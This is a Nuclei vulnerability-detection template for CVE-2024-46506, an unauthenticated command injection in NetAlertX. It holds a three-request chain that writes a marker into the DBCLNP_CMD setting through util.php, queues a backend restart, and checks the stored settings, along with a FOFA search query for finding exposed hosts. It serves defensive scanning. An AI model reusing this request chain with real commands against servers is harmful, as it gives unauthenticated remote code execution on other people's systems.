flow: http(1) && http(2) && http(3)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body,"OK")
    internal: true
    type: dsl
  raw:
  - 'POST /php/server/util.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    function=savesettings&settings=[["DBCLNP","DBCLNP_RUN","string","schedule"],["DBCLNP","DBCLNP_CMD","string","{{marker}}"],["DBCLNP","DBCLNP_RUN_SCHD","string","*
    * * * *"]]

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body,"{{uuid}}","added to the execution queue")
    internal: true
    type: dsl
  raw:
  - 'POST /php/server/util.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    function=addToExecutionQueue&action={{uuid}}|cron_restart_backend

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "{{marker}}")
    - contains(content_type,"application/json")
    type: dsl
  raw:
  - 'GET /api/table_settings.json HTTP/1.1

    Host: {{Hostname}}


    {{wait_for(5)}}

    '
id: CVE-2024-46506
info:
  author: s4e-io
  classification:
    cpe: cpe:2.3:a:netalertx:netalertx:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-46506
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-306
    epss-percentile: 0.99097
    epss-score: 0.80759
  description: 'NetAlertX 23.01.14 through 24.x before 24.10.12 allows unauthenticated
    command injection via settings update because function=savesettings lacks an authentication
    requirement, as exploited in the wild in May 2025. This is related to settings.php
    and util.php.

    '
  impact: 'Unauthenticated attackers can execute arbitrary commands on the NetAlertX
    server without authentication.

    '
  metadata:
    fofa-query: title="netalertx"
    product: netalertx
    vendor: netalertx
    verified: true
  name: "NetAlertX 23.01.14\u201324.x < 24.10.12 - Remote Code Execution"
  remediation: 'Update NetAlertX to version 24.10.12 or later.

    '
  severity: critical
  tags: cve,cve2024,netalertx,rce,intrusive,vkev,vuln
variables:
  marker: '{{to_lower(rand_base(6))}}'
  uuid: '{{to_lower(rand_base(8))}}-{{to_lower(rand_base(4))}}-{{to_lower(rand_base(4))}}-{{to_lower(rand_base(4))}}-{{to_lower(rand_base(12))}}'
